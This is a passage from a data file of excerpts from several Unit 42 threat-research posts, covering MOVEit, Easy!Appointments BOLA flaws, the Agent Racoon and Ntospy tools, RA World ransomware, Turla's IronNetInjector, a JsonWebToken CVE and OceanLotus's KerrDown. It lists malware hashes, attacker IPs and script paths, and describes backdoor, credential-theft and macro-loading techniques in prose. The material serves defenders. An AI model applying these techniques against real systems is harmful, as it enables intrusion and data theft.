\n3a977446ed70b02864ef8cfa3135d8b134c93ef868a4cc0aa5d3c2a74545725b \n348e435196dd795e1ec31169bd111c7ec964e5a6ab525a562b17f10de0ab031d \n0ea05169d111415903a1098110c34cdbbd390c23016cd4e179dd9ef507104495 \n9d1723777de67bc7e11678db800d2a32de3bcd6c40a629cd165e3f7bbace8ead \nb1c299a9fe6076f370178de7b808f36135df16c4e438ef6453a39565ff2ec272 \n9e89d9f045664996067a05610ea2b0ad4f7f502f73d84321fb07861348fdc24a \n6015fed13c5510bbb89b0a5302c8b95a5b811982ff6de9930725c4630ec4011d \nfe5f8388ccea7c548d587d1e2843921c038a9f4ddad3cb03f3aa8a45c29c6a2f \n702421bcee1785d93271d311f0203da34cc936317e299575b06503945a6ea1e0 \nc56bcb513248885673645ff1df44d3661a75cfacdce485535da898aa9ba320d4 \n3c0dbda8a5500367c22ca224919bfc87d725d890756222c8066933286f26494c \nbdd4fa8e97e5e6eaaac8d6178f1cf4c324b9c59fc276fd6b368e811b327ccf8b\nIPs:\n5.252.191[.]241 \n5.252.191[.]103 \n5.252.189[.]210 \n5.252.189[.]130 \n5.252.190[.]119 \n5.252.190[.]100 \n5.252.190[.]117 \n5.252.191[.]31 \n5.252.190[.]244 \n165.227.147[.]215 \n209.97.137[.]33\nUser Agents:\nMozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/113.0.0.0+Safari/537.36 \nMozilla/5.0+(Windows+NT+10.0;+Win64;+x64;+rv:109.0)+Gecko/20100101+Firefox/114.0 \nMozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.54+Safari/537.36\nUpdated June 15, 2023, at 2:42 p.m. PT to add preliminary details of the newly reported SQLi vulnerability.\nUpdated June 16, 2023, at 5:24 a.m. PT to add additional details on Unit 42 Incident Response cases, as well as details of Progress Software's recommended mitigations.\nUpdated June 16, 2023, at 11:33 a.m. PT to add additional CVE information for CVE-2023-35036 and CVE-2023-35708, as well as updated protections for Next-Generation Firewall. New data from Cortex Xpanse was added.\nUpdated July 7, 2023, at 2:20 p.m. PT to add additional information regarding CVE-2023-36934, CVE-2023-36932 and CVE-2023-36933.\nUpdated July 7, 2023, at 2:20 p.m. PT to add additional information regarding CVE-2023-36934, CVE-2023-36932 and CVE-2023-36933.\nUpdated October 4, 2023, at 6:00 a.m. PT to add additional information on Advanced Threat Prevention for SQL injection as well as new data.", "source": "Palo"}, {"title": "Introduction", "content": "Palo Alto Networks has been actively researching and developing security capabilities usingAI. In an effort to audit web applications for Broken Object-Level Authorization (BOLA) vulnerabilities, Unit 42 researchers developed an automated BOLA detection tool leveraging GenAI.\nIn 2023, we used our tool to test an open-source project,Easy!Appointments, and found 15 BOLA vulnerabilities. We notified the vendor, who has since patched the vulnerabilities. The number of issues we found highlights the prevalence of BOLA vulnerabilities in API applications and underscores the importance of continuously scrutinizing software for these potentially severe issues.\nEasy!Appointments is a popular tool used for scheduling and managing appointments, as well as synchronizing data with widely used calendar services. The vulnerabilities we discovered allow low-privileged and logged in users (such as customers) to view and manipulate appointments created by more privileged users (such as providers and admins).\nThe vulnerabilities we discovered, tracked asCVE-2023-3285toCVE-2023-3290andCVE-2023-38047toCVE-2023-38055, all affect different API endpoints. They have been assigned CVSS scores ranging from 5 to 9.9, with seven vulnerabilities scoring 9.9.\nUpon discovering these vulnerabilities, we collaborated closely with the maintainers to patch all the issues in the latest version 1.5.0. To mitigate the risks, organizations are advised to upgrade to Easy!Appointments version 1.5.0 or later immediately. Please reach out to info@easyappointments.org for more information on updating to the latest version.\nCortex XpanseandCortex XSIAMcustomers with the ASM module are able to detect all exposed Easy!Appointments instances as well as known insecure instances via targeted attack surface rules.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response team.", "source": "Palo"}, {"title": "Conclusion", "content": "As the use of APIs is increasing exponentially, so is the prevalence of API vulnerabilities and BOLA vulnerabilities in particular. This article details the 15 BOLA vulnerabilities Unit 42 researchers discovered inEasy!Appointmentsusing a new automatic methodology that leverages AI. Due to the ease of exploitation and potential impacts of these vulnerabilities, we encourage affected organizations to update to the patched version as soon as possible.\nResearchers at Unit 42 are committed to fortifying open-source software and innovating technology to discover new vulnerabilities more efficiently and effectively. Palo Alto Networks customers are better protected by our latest research findings and insights.\nCortex XpanseandCortex XSIAMcustomers with the ASM module are able to detect all exposed Easy!Appointments instances as well as known insecure instances via targeted attack surface rules.\nIf you think you might have been compromised or have an urgent matter, contact theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200", "source": "Palo"}, {"title": "Introduction", "content": "Unit 42 researchers observed a series of apparently related attacks against organizations in the Middle East, Africa and the U.S. We will discuss a set of tools used in the course of the attacks that reveal clues about the threat actors' activity. We are sharing this research to provide detection, prevention and hunting recommendations to help organizations strengthen their overall security posture.\nThese tools were used to perform the following activities:\nEstablish backdoor capabilities \nFor command and control (C2) \nSteal user credentials. \nExfiltrate confidential information\nUnit 42 is sharing these results with the purpose of helping organizations defend against the tools observed here.\nWe assess with medium confidence that this threat activity cluster aligns to nation-state related threat actors due to the nature of the organizations that were compromised, the TTPs observed and the customization of the tool set. We have not confirmed a particular nation-state or threat group.\nTools that were used in this cluster were the following:\nA new backdoor we've named Agent RacoonThis malware family is written using the .NET framework and leverages the domain name service (DNS) protocol to create a covert channel and provide different backdoor functionalities. Threat actors have used this along with the other two tools in multiple attacks targeting organizations across the U.S., Middle East and Africa. Its C2 infrastructure dates back to 2020. \nThis malware family is written using the .NET framework and leverages the domain name service (DNS) protocol to create a covert channel and provide different backdoor functionalities. Threat actors have used this along with the other two tools in multiple attacks targeting organizations across the U.S., Middle East and Africa. Its C2 infrastructure dates back to 2020. \nA new tool we've named NtospyThis malware is a Network Provider DLL module designed to steal user credentials. \nThis malware is a Network Provider DLL module designed to steal user credentials. \nA customized version of Mimikatz called Mimilite\nThe compromised organizations belong to the following industries:\nEducation \nReal estate \nRetail \nNon-profit organizations \nTelecom companies \nGovernments\nBased on unique similarities in tools as well as tactics, techniques and procedures (TTPs), we are tracking thisthreat activity clusteras CL-STA-0002.\nWhat follows is a detailed description of the activity we observed as well as characteristics of the tool set.\nPalo Alto Networks customers receive protection from these threats throughCortex XDRas well asAdvanced URL Filtering,DNS SecurityandAdvanced Wildfire. Organizations can engage the Unit 42 Incident Response team for specific assistance with this threat and others.", "source": "Palo"}, {"title": "Summary", "content": "The threat actor used temporary directories such asC:\\Windows\\Temp and C:\\Tempto deploy specific components of their tool set across the different affected organizations. They used the following similar filenames for batch and PowerShell scripts:\nc:\\windows\\temp\\crs.ps1 \nc:\\windows\\temp\\ebat.bat \nc:\\windows\\temp\\install.bat \nc:\\windows\\temp\\mslb.ps1 \nc:\\windows\\temp\\pb.ps1 \nc:\\windows\\temp\\pb1.ps1 \nc:\\windows\\temp\\pscan.ps1 \nc:\\windows\\temp\\set_time.bat \nc:\\windows\\temp\\usr.ps1\nWhile the attackers commonly usedNtospyacross the affected organizations, theMimilitetool and theAgent Racoonmalware have only been found in nonprofit and government-related organizations' environments.\nAfter each attack session, the threat actor leveragedcleanmgr.exeto clean up the environment used during the session.", "source": "Palo"}, {"title": "Conclusion", "content": "Our hope in sharing the descriptions of this tool set is that readers can use this information to search their networks to identify other possible attacks using these tools. This tool set is not yet associated with a specific threat actor, and not entirely limited to a single cluster or campaign.\nAs mentioned at the beginning of this article, we found an overlapping Ntospy sample with SHA256bcd2bdea2bfecd09e258b8777e3825c4a1d98af220e7b045ee7b6c30bf19d6dfwith apreviously identifiedthreat activity cluster CL-STA-0043. However, the overlaps are not limited to that sample.\nWe have also identified two compromised organizations in common across both activity clusters. Some of the TTPs match on both clusters, such as the MS Exchange PowerShell snap-ins and one of the Network Provider DLL modules.\nUnit 42 researchers believe this threat activity cluster aligns with medium confidence to nation-state related threat actors for the following reasons:\nThe detection and defense evasion techniques used \nThe exfiltration activity observed \nThe victimology \nThe customization level of the tools used \nThe TTPs observed\nPalo Alto Networks customers receive protections from the threats discussed above through the following products:\nCortex XDRincludes detections and protections related to the IoCs shared in this research \nAdvanced URL FilteringandDNS Securityblocks related C2 domains as malicious \nTheAdvanced WildFiremachine-learning models and analysis techniques have been reviewed and updated in light of the IoCs shared in this research\nIf you think you may have been compromised or have an urgent matter, get in touch with theUnit 42 Incident Response teamor call:\nNorth America Toll-Free: 866.486.4842 (866.4.UNIT42) \nEMEA: +31.20.299.3130 \nAPAC: +65.6983.8730 \nJapan: +81.50.1790.0200\nPalo Alto Networks has shared these findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about theCyber Threat Alliance.\nMITRE ATT&CK Mapping\nDuring the research activity related to the tool set uncovered on this blog, Unit 42 researchers identified a set of TTPs, which we've mapped to the MITRE ATT&CK matrix in the table below.", "source": "Palo"}, {"title": "Introduction", "content": "The term PoS refers to a machine used by businesses to conduct a retail transaction. If you have ever used a debit or credit card to make a purchase, you've likely seen these machines. They often run customized hardware and software, however, the underlying operating system (OS) is more commonly some version of Microsoft Windows, often Windows XP or Windows 7. This trend has shifted slightly in recent years with the popularity of mobile PoS devices, most of which run either Android or iOS. While these are becoming more common in smaller businesses, Windows-based PoS machines still make up the majority, and by association are the devices most heavily targeted by attackers.\nFigure 1. Example PoS machine", "source": "Palo"}, {"title": "Conclusion", "content": "Attacks targeting PoS devices have been occurring for many years, and show no sign up stopping in the near future. The universal rollout of \"chip and pin\" will likely deter traditional attacks facing PoS devices. This has been witnessed in Europe, where EMV technology has been widely adopted for a number of years. In such situations, the attackers typically change tactics. Instead of targeting PoS devices, attackers target e-commerce websites instead, dumping databases from these webservers and acquiring card data.\nIn general, intrusion techniques targeting PoS devices are often no different from techniques targeting other Internet or network-connected machines. The main difference lies in the payload, which these days are typically a keylogger, or much more commonly, a memory scraper. These payloads, or malware families, have evolved over time to become heavily automated. Such automation allows attackers to infect hundreds or thousands of machines at a time, and make changes at the click of a button.\nThose charged with the task of securing PoS devices should take necessary precautions in order to help prevent the theft of card data. Such precautions include, but are not limited to:\nEnsure PoS devices are not directly connected to the Internet. If required, proper controls should be enabled to only allow connections to specific hosts over specified network protocols. \nWeb browsing should be disabled completely on PoS devices if possibly. If not possible, controls should be enabled that restrict browsing to specific websites. \nPrevent unauthorized users from installing or running executables on PoS devices using process allowlisting. \nInstall security software, such as antivirus, on PoS devices. \nUpdate all necessary operating system patches. \nImplement network segmentation between PoS devices and other corporate infrastructure. \nEnsure any remote access applications, such as RDP, VNC, LogMeIn, etc. are configured with unique usernames and passwords, are fully up to date on patches, and are configured with 2-factor authentication if possible. \nProperly log host and network-based events.", "source": "Palo"}, {"title": "Introduction", "content": "Machine learning in security has a major challenge \u2013 it can't make mistakes. A mistake in one direction can lead to a risky slip of malware falling through the cracks. A mistake in the other direction causes your security solution to block good traffic, which is exorbitantly expensive for cybersecurity companies and a massive headache for consumers. In general, the amount of good (benign) traffic vastly outnumbers the amount of malicious traffic. Thus, minimizing errors on good traffic (called false positives) is key to building a good solution that makes few mistakes. Malware authors understand this and try to disguise their malicious code to look more like benign code. The most straightforward way to accomplish this is what's known as an \"append\" attack (also known as an injection or bundling), wherein an attacker takes a (typically large) amount of benign content and injects malicious content into it. Since machine learning classifiers built with standard techniques are sensitive to their presence, the benign content added by benign append attacks can perturb a classification away from a positive malware verdict, sometimes causing the classifier to miss it entirely.\nOur study, \"Innocent Until Proven Guilty (IUPG): Building Deep Learning Models with Embedded Robustness to Out-Of-Distribution Content,\" which wepresentedat the4th Deep Learning and Security Workshop(co-located with the 42nd IEEE Symposium on Security and Privacy), proposes a generic prototype-based learning framework for neural network classifiers designed to increase robustness to noise and out-of-distribution (OOD) content within inputs. In other words, that study addresses a broader issue than the problems of machine-learning classifiers aiming to identify malware. However, the original motivation to create the Innocent Until Proven Guilty (IUPG) learning framework was to overcome append attacks on malware classifiers. Here, we illustrate IUPG by placing it firmly in the context of how it can be used to identify malware.\nIn the following sections, we provide more detail about benign append attacks and how they can be successful against even highly accurate classifiers, and how IUPG specifically addresses the issue. We provide the results of our experiments with IUPG and how it fits in with existing work. We close with examples of how Palo Alto Networks uses IUPG-trained models to proactively detect malicious websites, and, in particular, JavaScript malware on web pages.\nPalo Alto Networks Next-Generation Firewall customers who useAdvanced URL Filtering,DNS Security, andWildFiresecurity subscriptions are better protected against benign append attacks through the use of IUPG.", "source": "Palo"}, {"title": "Conclusion", "content": "We've introduced the Innocent Until Proven Guilty (IUPG) learning framework, explained how it's designed to overcome the benign append attack, summarized results from our study presented at the 4th Deep Learning and Security Workshop and shared some interesting examples of using IUPG on real-world traffic. Palo Alto Networks continues to improve state-of-the-art malicious JavaScript detection. Our Next-Generation Firewall customers who useAdvanced URL Filtering,DNS Security, andWildFiresecurity subscriptions are better protected against benign append attacks through the use of IUPG.", "source": "Palo"}, {"title": "Introduction", "content": "The ransomware group RA Group, now known as RA World, showed a noticeable uptick in their activity since March 2024. About 37% of all posts on their dark web leak site have appeared since March, suggesting this is an emerging group to watch. This article describes the tactics, techniques and procedures (TTPs) used by RA World.\nRA World uses amulti-extortionscheme, which usually includes exfiltrating sensitive data from its victims prior to encrypting it. The ransomware operators then use the exfiltrated data as leverage, threatening to post it on their website in case victims do not meet their ransom demands.\nRA World notably experimented with a \"cost per customer\" calculation. Below victim entries, they posted comments such as, \"This company isn't willing to pay $0.5 per customer to protect their privacy.\"\nAnalysis of the posts on their leak site shows that RA World mainly impacted organizations in the healthcare industry until recently. The group did not appear to have any particular qualms about attacking organizations in a sensitive sector such as healthcare. Midway through 2024, manufacturing became the sector most impacted by the group. It is possible that the shift came from a desire to attack organizations more likely to be able to pay higher ransoms. However, many ransomware groups are simply opportunistic, and it is also possible the change was incidental.\nThe U.S. is the country most affected by these attacks, followed by countries in Europe and Southeast Asia.\nPalo Alto Networks customers are better protected against the ransomware used by RA World through the following products and services:\nCortex XDRandXSIAM \nCloud-Delivered Security Servicesfor theNext-Generation Firewallsuch asAdvanced WildFireandAdvanced URL Filtering\nThe Cortex XDR anti-ransomware module includes out-of-the-box protections that prevent adverse behavior from the ransomware samples we tested, without the need for specific detection logic or signatures.\nThePrisma CloudDefender should be deployed on cloud-based Windows virtual machines for better protection against the ransomware used by the RA World.Cortex Xpanseis able to provide visibility that can prove valuable for proactive protection.\nTheUnit 42 Incident Response teamcan also be engaged to help with a compromise or to provide a proactive assessment to lower your risk.", "source": "Palo"}, {"title": "Conclusion", "content": "In this article, we reviewed the latest developments in the operation of RA World that has recently rebranded itself from RA Group. We described evolutions in both their leak site and their operational tools. They used two different loaders to deliver their final payload, which was a new variant of the Babuk ransomware.\nThe RA World group remains steadily active, and they primarily affect the manufacturing sector according to their public leak site data.", "source": "Palo"}, {"title": "Indicators", "content": "Examples of Stage 1\n2a4e83ff1c48baa3d526d51d09782933cec6790d5fa8ccea07633826f378b18a \n57225f38b58564cf7ec1252fbf12475abee58bd6ea9500eb7570c49f8dc6a64c \n93aae0d740df62b5fd57ac69d7be75d18d16818e87b70ace5272932aa44f23e4 \naf4a08bbe9f698a8a9666c76c6bdac9a29b7a9572e025f85f2a6f62c293c0f5e \nf1c576ed08abbb21d546a42a0857a515d617db36d2e4a49bedd9c25034ccd1e2\nExamples of Stage 2\n2d22cbe3b1d13af824d10bb55b61f350cb958046adf5509768a010df53409aa8 \n330730d65548d621d46ed9db939c434bc54cada516472ebef0a00422a5ed5819\nExamples of Stage 3 (Babuk Variant)\n9479a5dc61284ccc3f063ebb38da9f63400d8b25d8bca8d04b1832f02fac24de \n31ac190b45cc32c04c2415761c7f152153e16750516df0ce0761ca28300dd6a4 \n74fb402bc2d7428a61f1ac03d2fb7c9ff8094129afd2ec0a65ef6a373fd31183 \n7c14a3908e82a0f3c679402cf060a0bcae7791bdc25715a49ee7c1fc08215c93 \n817b7dab5beba22a608015310e918fc79fe72fa78b44b68dd13a487341929e81 \n8e4f9e4c2bb563c918fbe13595de9a32b307e2ce9f1f48c06b168dbbb75b5e89 \nbb63887c03628a3f001d0e93ab60c9797d4ca3fb78a8d968b11fc19da815da2f \nd0c8dc7791e9462b6741553a411a5bfa5f4a9ad4ffcf91c0d2fc3269940e48a2 \nd311674e5e964e7a2408b0b8816b06587b2e669221f0e100d4e0d4a914c6202c \n25ba2412cf0b97353fa976f99fdd2d9ecbbe1c10c1b2a62a81d0777340ce0f0a \n31105fb81a54642024ef98921a524bf70dec655905ed9a2f5e24ad503188d8ae \n826f05b19cf1773076a171ef0b05613f65b3cc39a5e98913a3c9401e141d5285 \n36ce5b2c97892f86fd0e66d9dd6c4fbd4a46e7f91ea55cc1f51dee3a03417a3a \n108a3966b001776c0cadac27dd9172e506069cb35d4233c140f2a3c467e043d0 \nbc2caec044efe0890496c56f29d7c73e3915740bc5fda7085bb2bb89145621e5 \n1066395126da32da052f39c9293069f9bcc1c8d28781eb9d44b35f05ce1fd614 \nb2b59f10e6bdbe4a1f8ff560dbfe0d9876cbb05c7c27540bd824b17ceb082d62 \n4392dcce97df199e00efb7a301e26013a44ee79d9b4175d4539fae9aed4f750b \ne31f5ebff2128decd36d24af7e155c3011a9afdc36fd14480026de151e1ecee2 \n0183edb40f7900272f63f0392d10c08a3d991af41723ecfd38abdfbfdf21de0a", "source": "Palo"}, {"title": "Introduction", "content": "In recent years, more and more ready-made malware is released on software development hosting sites available for everybody to use \u2013 including threat actors. This not only saves the bad guys development time, but also makes it much easier for them to find new ideas to prevent detection of their malware.\nUnit 42 researchers have found several maliciousIronPythonscripts whose purpose is to load and runTurla'smalware tools on a victim's system. The use of IronPython for malicious purposesisn't new, but the way Turla uses itisnew. The overall method is known asBring Your Own Interpreter (BYOI). It describes the use of an interpreter, not present on a system by default, to run malicious code of an interpreted programming or scripting language.\nThe first malicious IronPython scripts of the tool we describe here were discovered last year by asecurity researcherfrom FireEye. At the beginning of this year, anothersecurity researcherfrom Dragos pointed out some new scripts of the same threat actor uploaded to VirusTotal from two different submitters. We found that one of the submitters also uploaded two other samples, which are most likely embedded payloads of one of the IronPython scripts. These samples helped us to understand how this tool works, what malware it loads and which threat actor uses it.\nWhile the IronPython scripts are only the first part of the tool, the main task of loading malware is done by an embedded process injector. We dubbed this toolchainIronNetInjector, the blend of IronPython and the injector's internal project nameNetInjector. In this blog, we describe the IronPython scripts and how they're used to load one or more payloads with the help of an injector.\nPalo Alto Networks customers are protected from this threat throughWildFireandCortex XDR.AutoFocuscustomers can investigate this activity with the tag \"IronNetInjector\".", "source": "Palo"}, {"title": "Conclusion", "content": "IronNetInjector is another toolset in Turla's ever-growing arsenal, made of an IronPython script and an injector. It's similar in structure to the previously used in-memory loading mechanism to execute malware with the help ofPowerShell scripts. These scripts contain an embedded PE loader to execute an embedded malware payload.\nThe tool we discussed in this blogpost was likely developed to move away from PowerShell towards .NET. This general trend can be seen in recent years as detection of Powershell based threats became better, but also due to security mechanisms likeAMSIintroduced by Microsoft.\nThe .NET injectors and bootstrappers contain clean code and meaningful function/method/variable names, and they use detailed log/error messages. Only the initial IronPython scripts are obfuscated to prevent easy detection.\nThere are still some questions we need answers for, such as what other samples get loaded beside ComRAT and the RPC backdoor? How do the IronPython scripts get run? And how is the interpreter deployed to a victim's system?\nWe will continue to monitor for this malware loading tool to get the missing pieces of the puzzle.\nPalo Alto Networks customers are protected from this malware tool. Our threat prevention platform WildFire detects it as malicious. Our extended detection and response platform Cortex XDR can identify and block the malware execution. AutoFocus customers can track the activity with the tag \"IronNetInjector\".", "source": "Palo"}, {"title": "Indicators", "content": "b641687696b66e6e820618acc4765162298ba3e9106df4ef44b2218086ce8040 (prophile.py, submitter 1)\nc430ebab4bf827303bc4ad95d40eecc7988bdc17cc139c8f88466bc536755d4e (profilec.py, submitter 1)\nc1b8ecce81cf4ff45d9032dc554efdc7a1ab776a2d24fdb34d1ffce15ef61aad (profile.py, submitter 2)\n8df0c705da0eab20ba977b608f5a19536e53e89b14e4a7863b7fd534bd75fd72 (10profilec.py, submitter 3)\nb5b4d06e1668d11114b99dbd267cde784d33a3f546993d09ede8b9394d90ebb3 (120profilec.py, submitter 3)\nb095fd3bd3ed8be178dafe47fc00c5821ea31d3f67d658910610a06a1252f47d (220profile.py, submitter 3)\n3aa37559ef282ee3ee67c4a61ce4786e38d5bbe19bdcbeae0ef504d79be752b6 (profilec.py, submitter 4)\na56f69726a237455bac4c9ac7a20398ba1f50d2895e5b0a8ac7f1cdb288c32cc (2019 variant, submitter 4)\nc59fadeb8f58bbdbd73d9a2ac0d889d1a0a06295f1b914c0bd5617cfb1a08ce9 (2018 variant, submitter 5)\n63d7695dabefb97aa30cbe522647c95395b44321e1a3b08b8028e4000d1be15e\nba17af72a9d90822eed447b8526fb68963f0cde78df07c16902dc5a0c44536c4\n82333533f7f7cb4123bceee76358b36d4110e03c2219b80dced5a4d63424cc93 (IronPython-2.7.7z, submitter 1)\na62e1a866bc248398b6abe48fdb44f482f91d19ccd52d9447cda9bc074617d56 (ComRAT v4 variant, submitter 4)\n18c173433daafcc3aea17fc4f7792d0ff235f4075a00feda88aa1c9f8f6e1746 (RPC backdoor variant, submitter 5)\na64e79a81b5089084ff88e3f4130e9d5fa75e732a1d310a1ae8de767cbbab061 (RPC backdoor variant, submitter 5)", "source": "Palo"}, {"title": "Introduction", "content": "Jan. 30, 2023\nAfter hearing the community's feedback about the prerequisites of the exploitation scenario of the vulnerability, we made the decision to work with Auth0 to retract CVE-2022-23529.\nThe security issue described in this blog remains a concern when the JsonWebToken library is used in an insecure way. In that scenario, if all the prerequisites are met, the issue may be exploitable. We agree that the source of this risk in that case will be in the calling code, and not in the library.\nImportant security checks were added to the JsonWebToken code to address this issue.\nUsers of jsonwebtoken 8.5.1 and earlier are encouraged to update to the latest version, 9.0.0, which presents safer code that fixes this security flaw and others, and prevents misuse of the package that was presented in this blog.\nWe want to thank Auth0 for their work to address the security issue, as well as the security community for the interest and feedback. We would also like to thank GitHub for their help.The update can be read on the Auth0 GitHub.\nJan. 12, 2023\nAfter receiving feedback from the community, we decided to make some clarifications regarding possible exploitation.We originally mentioned that an attacker needs to have control over the secret manager and decided that there was a practical need to make this even more clear in our language and associated figures.", "source": "Palo"}, {"title": "Summary", "content": "Unit 42 researchers discovered a new vulnerability in the popular JsonWebToken open source project. The vulnerability is identified asCVE-2022-23529, rated high severity (CVSS 7.6).\nBy exploiting this vulnerability, attackers could achieve remote code execution (RCE) on a server verifying a maliciously crafted JSON web token (JWT) request. This vulnerability requires several prerequisites in order to be exploitable, which makes it less likely for an attacker to use it in the wild.\nIf you are using JsonWebToken8.5.1or an earlier version, we suggest updating to JsonWebToken version9.0.0, which includes a fix for this vulnerability.\nJsonWebTokenis an open source JavaScript package that allows you to verify/sign JWTs, which are mainly used for authorization and authentication purposes. Developed and maintained by Auth0, the package had over 9 million weekly downloads at the time of writing, and over 20,000 dependents (according to the JsonWebToken page). This package plays a big role in the authentication and authorization functionality for many applications.\nPalo Alto Networks customers can identify assets that are running vulnerable versions of the JsonWebToken package with Prisma Cloud, and they can identify the relevant CVE within scan results.", "source": "Palo"}, {"title": "Introduction", "content": "Figure1:Lure document\nOnce we increase the font size, the base64 blobs are visible in two different tables. Once decoded you can see the MZ header of the PE DLL at the beginning of each table, as shown in Figure 2.\nFigure2:Base64encodedpedllfilesembedded as text in the document.\nFigure 3 shows a code excerpt from the embedded macro that checks which base64 blob should be decoded based on the iCheck variable, a Boolean value which is set to true if the victim system is running on a 64-bit system and false on a 32-bit system. If the system is found to be 64-bit, the base64 encoded blob on the left is decoded otherwise the base64 encoded blob on the right is decoded.\nFigure3:Base64blob selection based on system check\nWe also noticed that the actors reused the VBS decode function published byMotobit. Figure 4 shows the comparison between the base64 function used in the macro code and the VBS base64 decoder function published by Motobit.\nFigure4:Base64decoder comparison", "source": "Palo"}, {"title": "Conclusion", "content": "OceanLotus has been an active threat actor group for a number of years and remains one of the most sophisticated threat actors in the APAC region. As we have seen with the new KerrDown downloader being used in their recent campaigns, the group continues to build and employ new tools and techniques in their overall operations and playbooks. It is therefore imperative to understand and keep a track of the group's ongoing operations and capability to better defend against such threats. Given the high number of samples observed, we were also able to discern possible working hour patterns which shows us that the group likely has formal working hours and operating out of a region which is like Vietnam or nearby countries. While most of the targeting observed is towards Vietnamese speaking victims, given the known broader geographic and industry wide target base of OceanLotus, the group may use similar tools and playbooks against other targets.\nPalo Alto Networks customers are already protected via:\nAll samples in this report have a malicious verdict in WildFire \nDomains have been classified as malicious \nAutoFocus tags are available for additional context:OceanLotusandKerrDown.", "source": "Palo"}, {"title": "Indicators", "content": "Lure Docs:\n73dcbcc47d6bd95dcf031ebbd34ac42301a20ee1143ac130b405e79b4ba40fc8\n89e19df797481ae2d2c895bcf030fe19e581976d2aef90c89bd6b3408579bfc3\na4a066341b4172d2cb752de4b938bf678ceb627ecb72594730b78bd05a2fad9d\n8bf22202e4fd4c005afde2266413cba9d1b749b1a2d75deac0c35728b5eb3af8\ndf8210d20c5eb80d44ba8fa4c41c26c8421dcb20168e4f796e4955e01ebc9e13\n94fab926b73a6a5bc71d655c8d611b40e80464da9f1134bfce7b930e23e273ab\n4321a9f95901a77b4acfbaef3596cf681712345e1cbd764873c6643fe9da7331\nKerrDown DLLs:\n4a0309d8043e8acd7cb5c7cfca95223afe9c15a1c34578643b49ded4b786506b\n4b431af677041dae3c988fcc901ac8ec6e74c6e1467787bf099c4abd658be5be\n4bc00f7d638e042da764e8648c03c0db46700599dd4f08d117e3e9e8b538519b\n4e2f8f104e6cd07508c5b7d49737a1db5eeba910adfdb4c19442a7699dc78cfc\n4e791f2511c9bd3c63c8e37aa6625d8b590054de9e1cca13a7be2630bc2af9ce\n539e8a53db3f858914cfe0d2132f11de34a691391ba71673a8b1e61367a963c7\n53cd92f37ffd0822cc644717363ba239d75c6d9af0fa305339eaf34077edd22d\n53efaac9244c24fab58216a907783748d48cb32dbdc2f1f6fb672bd49f12be4c\n5c18c3e6f7ac0d0ac2b5fa9a6435ee90d6bd77995f85bed9e948097891d42ca2\n5cda7d8294a8804d09108359dd2d96cdf4fdcf22ec9c00f0182d005afff76743\n5f0db8216314da1f128b883b918e5ac722202a2ae0c4d0bf1c5da5914a66778e\n6010d44cdca58cdec4559040e08798e7b28b9434bda940da0a670c93c84e33cd\n60b65ebb921dca4762aef427181775d10bbffc30617d777102762ab7913a5aa1\n6146aedfe47597606fb4b05458ec4b99d4e1042da7dc974fa33a57e282cd7349\n6245b74b1cc830ed95cb630192c704da66600b90a331d9e6db70210acb6c7dfa\n67cd191eb2322bf8b0f04a63a9e7cb7bc52fb4a4444fcb8fed2963884aede3aa\n68f77119eae5e9d2404376f2d87e71e4ab554c026e362c57313e5881005ae79e\n69e679daaaff3832c39671bf2b813b5530a70fb763d381f9a6e22e3bc493c8a9\n6faa7deb1e1e0c3a7c62c2bb0ecdfa56b6e3ba4fe16971ec4572267ac70b9177\n6fb397e90f72783adec279434fe805c732ddb7d1d6aa72f19e91a1bf585e1ea5\n70db041fb5aadb63c1b8ae57ba2699baa0086e9b011219dcebcccbf632017992\n7673f5468ba3cf01500f6bb6a19ce7208c8b6fc24f1a3a388eca491bc25cd9cd\n77805a46f73e118ae2428f8c22ba28f79f7c60aeb6305d41c0bf3ebb9ce70f94\n788265447391189ffc1956ebfec990dc051b56f506402d43cd1d4de96709c082\n7be613237b57fbc3cb83d001efadeed9936a2f519c514ab80de8285bdc5a666c\n7dbb7fab4782f5e3b0c416c05114f2a51f12643805d5f3d0cd80d32272f2731a\n7ec77e643d8d7cc18cc67c123feceed91d10db1cc9fa0c49164cba35bb1da987\n860f165c2240f2a83eb30c412755e5a025e25961ce4633683f5bc22f6a24ddb6\n868ed69533fac80354a101410d3dd0a66f444385c6611cc85c5b0be49db2d6fd\n89759e56d5c23085e47d2be2ce4ad4484dfdd4204044a78671ed434cec19b693\n8b7fb1cd5c09f7ec57ccc0c4261c0b4df0604962556a1d401b9cbfd750df60ba\n8d6e31c95d649c08cdc2f82085298173d03c03afe02f0dacb66dd3560149184f\n942d763604d0aefdff10ce095f806195f351124a8433c96f5590d89d809a562f\n98a5f30699564e6d9f74e737a611246262907b9e91b90348f7de53eb4cf32665\n9e6011d6380207e2bf5105cde3d48e412db565b92cdc1b3c6aa15bd7bd4b099f\na106e0a6b7cc30b161e5ea0b1ec0f28ab89c2e1eb7ba2d5d409ddbabc3b037e6\na2b905c26e2b92e63de85d83e280249258cb21f300d8c4a3a6bdb488676e9bcf\na4a86e96f95f395fcf0ceb6a74a2564f4ba7adbe1b40cc702b054427327a0399\na8192656dd1db0be4cec9d03b4d10e0529d9c52c899eda8d8e72698acfb61419\na8f776bd3a9593e963b567ce790033fec2804ea0afb40a92d40e21d8f33d066f\nb4966f8febdba6b2d674afffc65b1df11e7565acbd4517f1e5b9b36a8c6a16ed\nbb25f1a73d095d57b2c8c9ac6780e4d412ddf3d9eef84a54903cc8e4eaefc335\nbc82bce004afb6424e9d9f9fc04a84f58edf859c4029eda08f7309dbeec67696\nc30198e0b0e470d4ac8821bd14bb754466e7974f1c20be8b300961e9e89ed1ea\ncaabc45e59820a4349db13f337063eddede8a0847ae313d89a800f241d8556c8\nd3ef6643ad529d43a7ec313b52c8396dc52c4daad688360eb207ee91a1caf7b2\ne3c818052237bb4bb061290ab5e2a55c3852c8a3fef16436b1197e8b17de2e18\ne56ffcf5df2afd6b151c24ddfe7cd450f9208f59b5731991b926af0dce24285a\ne8704bf6525c90e0f5664f400c3bf8ff5da565080a52126e0e6